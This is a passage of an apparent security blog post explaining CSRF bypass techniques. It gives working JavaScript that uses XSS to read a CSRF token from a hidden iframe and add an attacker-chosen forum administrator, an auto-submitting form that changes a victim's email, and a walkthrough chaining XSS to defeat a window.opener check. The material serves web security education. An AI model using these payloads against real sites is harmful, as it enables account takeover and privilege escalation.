+</span></span></code></pre></div><ul>
+<li>XSS can be used to obtain administrator rights on a <code>vBulletin</code> or <code>phpBB</code> forum</li>
+<li>The data may have to be sent twice using POST, and can be done using an iframe within an iframe</li>
+<li>It is possible to read a token from a page protected by CSRF and create a form with that token</li>
+<li>This script uses an iframe to load the page that is protected by CSRF, writes a wanted name in the form and then presses the submit button.</li>
+<li>This can be done more easily by using the <strong>contentDocument</strong> property in Mozilla browsers, however this might not work on all browsers.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;iframe id=&#34;iframe&#34; src=&#34;/admin/admin.php?action=add_admin&#34; width=&#34;0&#34; height=&#34;0&#34; onload=&#34;read()&#34;&gt;&lt;/iframe&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>() {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Nytro&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">contentDocument</span>.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;form width=&#34;0&#34; height=&#34;0&#34; method=&#34;post&#34; action=&#34;/admin/add_admin.php&#34;&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;input type=&#34;text&#34; name=&#34;name&#34; value=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; /&gt;&lt;br /&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34; /&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Add_admin&#34; /&gt;&lt;br /&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;/form&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>.<span style="color:#a6e22e">click</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;iframe id=&#34;iframe&#34; src=&#34;/admin/admin.php?actiune=add_admin&#34; width=&#34;0&#34; height=&#34;0&#34; onload=&#34;read()&#34;&gt;&lt;/iframe&gt;&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>() {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Nytro&#39;</span>;
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">contentDocument</span>.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>).<span style="color:#a6e22e">contentDocument</span>.<span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">submit</span>.<span style="color:#a6e22e">click</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="another-bypass-technique">Another Bypass Technique</h2>
+<p>Look at this request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">home</span><span style="color:#f92672">/</span><span style="color:#a6e22e">accountsettings</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">websecgeeks</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">6.1</span>; <span style="color:#a6e22e">WOW64</span>; <span style="color:#a6e22e">rv</span><span style="color:#f92672">:</span><span style="color:#ae81ff">36.0</span>) <span style="color:#a6e22e">Gecko</span><span style="color:#f92672">/</span><span style="color:#ae81ff">20100101</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Firefox</span><span style="color:#f92672">/</span><span style="color:#ae81ff">36.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#a6e22e">websecgeeks</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">57</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">newemail</span><span style="color:#f92672">=</span><span style="color:#a6e22e">attacker</span><span style="color:#f92672">@</span><span style="color:#a6e22e">something</span><span style="color:#f92672">.</span><span style="color:#a6e22e">com</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Submit</span><span style="color:#f92672">=</span><span style="color:#a6e22e">S</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>We can say that this code might be vulnerable to CSRF, as there is no <code>Random Tokens</code> exist.</p>
+<ul>
+<li>Let’s try to make an exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">”http://websecgeeks.com/home/accountsettings”</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">”POST”</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">”hidden”</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">”newemail”</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">”attacker@attacker.com”</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">”hidden”</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">”Submit”</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">”Save”</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">”submit”</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">”Submit</span> <span style="color:#a6e22e">form</span><span style="color:#960050;background-color:#1e0010">”</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>/html
+</span></span></code></pre></div></li>
+<li>
+<p>However, when executed the page in an authenticated session, the application logged out.</p>
+</li>
+<li>
+<p>The application was validating the <strong>Referrer Value</strong> and tried manually adding a valid value, but the application still logged out.</p>
+</li>
+<li>
+<p>The Researcher found a JavaScript code that was responsible for this protection:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(window.<span style="color:#a6e22e">opener</span> <span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>){ <span style="color:#a6e22e">top</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/homedirectory/logoutuser&#34;</span>; }
+</span></span></code></pre></div><ul>
+<li>This code checks for the value of the <code>window.opener</code> property and if it is null, the application logs the user out and terminates the session</li>
+<li>According to Windows Opener Description.
+<ul>
+<li>When a window is opened from another window, it maintains a reference to that first window as <code>window.opener</code>.</li>
+<li>If the current window has no opener, this method returns NULL.</li>
+<li>Windows Phone browser does not support window.opener. It is also not supported in IE if the opener is in a different security zone.</li>
+</ul>
+</li>
+<li>Now anyhow we have to set the windows opener value to while doing CSRF attack.</li>
+<li>To successfully perform a CSRF attack on this application, the attacker must set the <code>window.opener</code> value to a <code>non-null</code> value.</li>
+</ul>
+<h3 id="exploiting">Exploiting</h3>
+<ul>
+<li>Let’s create two pages <code>xss.php</code> <code>csrf.html</code> hosted on <code>localhost</code>.</li>
+<li>The <code>xss.php</code> page contained an un-filtered parameter called &ldquo;zip&rdquo; with a link to the csrf3.html page</li>
+<li>The <code>csrf3.html</code> page contained a form with hidden fields for automatically submitting values when opened</li>
+<li>The final URL sent to the victim was <a href="http://127.0.0.1/xss.php?zip=">http://127.0.0.1/xss.php?zip=</a>
+<code>&lt;a href=&quot;[http://127.0.0.1/csrf3.html](http://127.0.0.1/csrf3.html)&quot;&gt;Link For Target Application&lt;/a&gt;</code></li>
+<li>After clicking the link, the attacker was able to open a new page in a new tab without getting logged out and bypassing CSRF security</li>
+</ul>
+<p><em>&ldquo;Client side security is not foolproof, so it is important to properly implement solutions for preventing web application attacks&rdquo;</em></p>
+<p><strong>References</strong> =&gt; <a href="https://www.exploit-db.com/docs/13534">ExploitDB Paper</a></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
